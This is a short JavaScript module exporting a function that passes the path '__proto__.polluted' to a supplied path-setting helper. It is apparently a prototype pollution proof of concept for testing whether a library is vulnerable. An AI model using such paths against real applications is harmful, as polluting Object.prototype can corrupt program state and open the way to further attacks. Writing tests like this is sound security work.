function exploitFunction(setPath, obj) {
    setPath(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };